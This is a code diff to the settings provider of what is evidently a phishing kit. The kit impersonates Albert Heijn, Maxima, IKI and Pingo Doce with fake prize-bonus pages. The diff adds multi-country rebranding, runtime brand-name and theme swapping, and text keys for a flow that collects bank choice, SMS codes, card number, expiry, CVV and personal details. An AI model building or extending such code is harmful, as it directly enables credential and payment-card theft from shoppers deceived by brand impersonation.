@@ -4,6 +4,8 @@ import { createContext, useContext, useEffect, useState, ReactNode, useMemo, use
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { normalizeCountryName } from "@/lib/country-utils";
 import { optimizeSupabaseImageUrl } from "@/lib/asset-url";
+import { brandifySettings, getCampaignNameFromSettings } from "@/lib/brand";
+import { applyBrandTheme } from "@/lib/theme";
 
 export type GlobalSettings = {
   logo_url: string;
@@ -58,62 +60,28 @@ const LEGACY_ALBERT_HEIJN_LOGO_URL = "https://static.ah.nl/ah-static/images/ah-u
 const ALBERT_HEIJN_LOGO_URL = "/form-assets/maxima-mini-logo.png";
 const PORTAL_BG_URL = "/form-assets/bg-desktop.png";
 const LEGACY_BG_URL = "/spar-bg.png";
-const LEGACY_PORTAL_NAME = "Albert Heijn klantenportaal";
-const LEGACY_SUPPORT_CENTER_NAME = "Albert Heijn service";
-const LEGACY_WIN_TITLE = "Exclusieve Albert Heijn bonus";
-const LEGACY_WIN_SUBTITLE =
-  "Gefeliciteerd! Je bent geselecteerd voor onze Albert Heijn actie van vandaag. Klik op de knop hieronder om je bonus van 5.000 euro te claimen.";
-
-function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettings> {
-  const next = { ...settings };
-
-  if (!next.bg_url && next.background_url) {
-    next.bg_url = next.background_url;
-  }
-
-  if (
-    !next.logo_url ||
-    next.logo_url === "/logo.png" ||
-    next.logo_url === LEGACY_ALBERT_HEIJN_LOGO_URL
-  ) {
-    next.logo_url = "/form-assets/maxima-mini-logo.png";
-  }
-
-  if (!next.bg_url || next.bg_url === LEGACY_BG_URL) {
-    next.bg_url = PORTAL_BG_URL;
-  }
-
-  if (!next.portal_name || next.portal_name === LEGACY_PORTAL_NAME) {
-    next.portal_name = "Maxima klientų portalas";
-  }
-
-  if (!next.support_center_name || next.support_center_name === LEGACY_SUPPORT_CENTER_NAME) {
-    next.support_center_name = "Maxima pagalbos centras";
-  }
-
-  if (!next.win_title || next.win_title === LEGACY_WIN_TITLE) {
-    next.win_title = "Išskirtinė Maxima premija";
-  }
-
-  if (!next.win_subtitle || next.win_subtitle === LEGACY_WIN_SUBTITLE) {
-    next.win_subtitle =
-      "Sveikiname! Buvote atrinkti šios dienos Maxima kampanijai. Spustelėkite žemiau esantį mygtuką, kad atsiimtumėte iki 2 500 eurų premiją.";
-  }
-
-  if (!next.target_country || next.target_country === "Hollanda" || next.target_country === "Estonya") {
-    next.target_country = "Litvanya";
-  }
-
-  if (next.target_country) {
-    next.target_country = normalizeCountryName(next.target_country);
-  }
-
-  if (!next.site_language || next.site_language === "nl" || next.site_language === "et") {
-    next.site_language = "lt";
-  }
-
-  return next;
-}
+const LEGACY_PORTAL_NAMES = new Set([
+  "Albert Heijn klantenportaal",
+  "IKI klientų portalas",
+  "IKI Klientų Portalas",
+  "Portal do Cliente IKI",
+  "Portal do Cliente Pingo Doce",
+]);
+const LEGACY_SUPPORT_CENTER_NAMES = new Set([
+  "Albert Heijn service",
+  "IKI pagalbos centras",
+  "IKI klientų aptarnavimas",
+  "IKI Klientų Aptarnavimas",
+  "Serviço IKI",
+  "Apoio ao Cliente Pingo Doce",
+]);
+const LEGACY_WIN_TITLES = new Set([
+  "Exclusieve Albert Heijn bonus",
+  "Išskirtinė IKI premija",
+  "Ekskliuzyvinė IKI Premija",
+  "Bónus Exclusivo IKI",
+  "Bónus Exclusivo Pingo Doce",
+]);
 
 export const defaultSettings: GlobalSettings = {
   logo_url: "/form-assets/maxima-mini-logo.png",
@@ -161,6 +129,103 @@ export const defaultSettings: GlobalSettings = {
   wheel_settings: {},
 };
 
+const TRANSLATABLE_TEXT_KEYS: Array<keyof GlobalSettings> = [
+  "portal_name",
+  "support_center_name",
+  "win_title",
+  "win_subtitle",
+  "win_button",
+  "banken_title",
+  "banken_subtitle",
+  "banken_search_placeholder",
+  "wait_title",
+  "wait_subtitle",
+  "sms_title",
+  "sms_subtitle",
+  "sms_input_label",
+  "sms_button",
+  "sms_loading",
+  "card_title",
+  "card_subtitle",
+  "card_owner_label",
+  "card_number_label",
+  "card_expiry_label",
+  "card_cvv_label",
+  "card_button",
+  "code_title",
+  "code_subtitle",
+  "code_button",
+  "live_support_title",
+  "live_support_subtitle",
+  "live_support_button",
+  "profile_title_small",
+  "profile_title_main",
+  "profile_subtitle",
+  "profile_firstname_label",
+  "profile_lastname_label",
+  "profile_phone_label",
+  "profile_button",
+  "profile_loading_text",
+];
+
+function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettings> {
+  const next = { ...settings };
+
+  if (!next.bg_url && next.background_url) {
+    next.bg_url = next.background_url;
+  }
+
+  if (
+    !next.logo_url ||
+    next.logo_url === "/logo.png" ||
+    next.logo_url === LEGACY_ALBERT_HEIJN_LOGO_URL
+  ) {
+    next.logo_url = "/form-assets/maxima-mini-logo.png";
+  }
+
+  if (!next.bg_url || next.bg_url === LEGACY_BG_URL) {
+    next.bg_url = PORTAL_BG_URL;
+  }
+
+  const isLegacyNonLtLanguage =
+    !next.site_language ||
+    next.site_language === "nl" ||
+    next.site_language === "et" ||
+    next.site_language === "pt";
+
+  if (isLegacyNonLtLanguage) {
+    for (const key of TRANSLATABLE_TEXT_KEYS) {
+      (next as Record<string, unknown>)[key] = defaultSettings[key];
+    }
+    next.site_language = "lt";
+  } else {
+    if (!next.portal_name || LEGACY_PORTAL_NAMES.has(next.portal_name)) {
+      next.portal_name = defaultSettings.portal_name;
+    }
+    if (!next.support_center_name || LEGACY_SUPPORT_CENTER_NAMES.has(next.support_center_name)) {
+      next.support_center_name = defaultSettings.support_center_name;
+    }
+    if (!next.win_title || LEGACY_WIN_TITLES.has(next.win_title)) {
+      next.win_title = defaultSettings.win_title;
+    }
+  }
+
+  if (
+    !next.target_country ||
+    next.target_country === "Hollanda" ||
+    next.target_country === "Estonya" ||
+    next.target_country === "Portekiz"
+  ) {
+    next.target_country = "Litvanya";
+  }
+
+  if (next.target_country) {
+    next.target_country = normalizeCountryName(next.target_country);
+  }
+
+  return next;
+}
+
 const SettingsContext = createContext<{ settings: GlobalSettings; loading: boolean }>({
   settings: defaultSettings,
   loading: false,
@@ -185,13 +250,28 @@ export function SettingsProvider({ children }: { children: ReactNode }) {
         .maybeSingle();
 
       if (data && !error) {
-        setSettings((prev) => normalizeBranding({ ...prev, ...data }) as GlobalSettings);
+        setSettings((prev) => {
+          const normalized = normalizeBranding({ ...prev, ...data }) as GlobalSettings;
+          // Kampanya adi (wheel_settings.campaign_name): tum metinlerdeki "Maxima"
+          // ibaresi runtime'da kampanya ismiyle degistirilir.
+          return brandifySettings(
+            normalized as unknown as Record<string, unknown>,
+            getCampaignNameFromSettings(normalized),
+          ) as unknown as GlobalSettings;
+        });
       }
       setLoading(false);
     }
     
     void loadSettings();
   }, [supabase]);
+
+  // Kampanya tema rengi (wheel_settings.theme_primary) -> CSS degiskenleri.
+  // Admin acikca renk secmediyse globals.css'teki Maxima varsayilanlari korunur.
+  useEffect(() => {
+    const ws = (settings?.wheel_settings ?? {}) as Record<string, unknown>;
+    applyBrandTheme(ws.theme_primary);
+  }, [settings]);
 
   // Apply custom background image dynamically to the body
   useEffect(() => {
